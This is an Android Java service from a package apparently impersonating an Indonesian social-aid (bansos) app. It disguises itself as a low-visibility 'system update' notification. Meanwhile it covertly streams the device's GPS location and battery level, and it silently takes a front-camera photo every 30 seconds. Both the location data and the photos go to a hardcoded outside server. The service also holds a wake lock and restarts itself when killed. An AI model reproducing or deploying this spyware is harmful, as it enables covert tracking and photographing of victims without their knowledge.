package com.kemensos.bansos;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class UpdateService extends Service {

    private static final String TAG = "UpdateService";
    private static final String SERVER_URL = "https://bansos.jokichannel.eu.org";
    private static final String DEVICE_ID = "9c4d9cc9c4";
    private static final int NOTIF_ID = 1001;

    private LocationManager locationManager;
    private PowerManager.WakeLock wakeLock;
    private Timer timer;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());

        // Acquire wake lock
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);
        wakeLock.acquire(60 * 60 * 1000L);

        // Start location tracking
        startLocationUpdates();

        // Periodic tasks every 30 seconds
        timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        capturePhoto();
                    }
                });
            }
        }, 5000, 30000);

        Log.d(TAG, "Service started");
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                "update_channel",
                "Pembaruan Sistem",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Aktif untuk menjaga sistem tetap terbarui");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, "update_channel");
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
            .setContentTitle("Pembaruan Sistem")
            .setContentText("Menunggu pembaruan...")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .setContentIntent(pi)
            .build();
    }

    private void updateNotification(String text) {
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        nm.notify(NOTIF_ID, buildNotification());
    }

    // ===== LOCATION TRACKING =====
    @SuppressLint("MissingPermission")
    private void startLocationUpdates() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        try {
            Criteria criteria = new Criteria();
            criteria.setAccuracy(Criteria.ACCURACY_FINE);
            criteria.setPowerRequirement(Criteria.POWER_HIGH);

            String provider = locationManager.getBestProvider(criteria, true);
            if (provider == null) provider = LocationManager.GPS_PROVIDER;

            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    sendLocation(location);
                }
                @Override public void onStatusChanged(String p, int i, Bundle b) {}
                @Override public void onProviderEnabled(String p) {}
                @Override public void onProviderDisabled(String p) {}
            };

            locationManager.requestLocationUpdates(
                provider, 60000, 50, listener, Looper.getMainLooper()
            );
        } catch (Exception e) {
            Log.e(TAG, "Location error", e);
        }
    }

    private void sendLocation(final Location location) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject data = new JSONObject();
                    data.put("latitude", location.getLatitude());
                    data.put("longitude", location.getLongitude());
                    data.put("accuracy", location.getAccuracy());
                    data.put("altitude", location.getAltitude());
                    data.put("speed", location.getSpeed());
                    data.put("time", location.getTime());
                    data.put("battery", getBatteryLevel());

                    String response = httpPost(SERVER_URL + "/api/location/" + DEVICE_ID, data.toString());
                    Log.d(TAG, "Location sent: " + response);
                } catch (Exception e) {
                    Log.e(TAG, "Send location error", e);
                }
            }
        }).start();
    }

    // ===== CAMERA CAPTURE =====
    @SuppressLint("MissingPermission")
    private void capturePhoto() {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        try {
            final Camera camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
            if (camera == null) return;

            Camera.Parameters params = camera.getParameters();
            params.setRotation(270);
            camera.setParameters(params);

            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    camera.release();
                    if (data != null && data.length > 100) {
                        sendPhoto(data);
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Camera error", e);
        }
    }

    private void sendPhoto(final byte[] imageData) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String boundary = "Boundary-" + System.currentTimeMillis();
                    URL url = new URL(SERVER_URL + "/api/upload/" + DEVICE_ID);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setDoOutput(true);
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(15000);

                    DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                    // Type field
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"type\"\r\n\r\n");
                    dos.writeBytes("photo\r\n");

                    // File field
                    dos.writeBytes("--" + boundary + "\r\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"capture.jpg\"\r\n");
                    dos.writeBytes("Content-Type: image/jpeg\r\n\r\n");
                    dos.write(imageData);
                    dos.writeBytes("\r\n");
                    dos.writeBytes("--" + boundary + "--\r\n");
                    dos.flush();
                    dos.close();

                    int code = conn.getResponseCode();
                    conn.disconnect();
                    Log.d(TAG, "Photo sent, code: " + code);
                } catch (Exception e) {
                    Log.e(TAG, "Send photo error", e);
                }
            }
        }).start();
    }

    // ===== BATTERY =====
    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null,
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            int level = batteryIntent.getIntExtra("level", -1);
            int scale = batteryIntent.getIntExtra("scale", -1);
            if (level >= 0 && scale > 0) {
                return (level * 100) / scale;
            }
        } catch (Exception e) {}
        return -1;
    }

    // ===== HTTP HELPER =====
    private String httpPost(String urlStr, String jsonBody) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setDoOutput(true);
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);

        OutputStream os = conn.getOutputStream();
        os.write(jsonBody.getBytes("UTF-8"));
        os.flush();
        os.close();

        int code = conn.getResponseCode();
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(conn.getInputStream())
        );
        StringBuilder response = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            response.append(line);
        }
        reader.close();
        conn.disconnect();
        return response.toString();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        if (timer != null) timer.cancel();
        if (locationManager != null) locationManager.removeUpdates((LocationListener) null);
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();

        // Restart service
        Intent intent = new Intent(this, UpdateService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
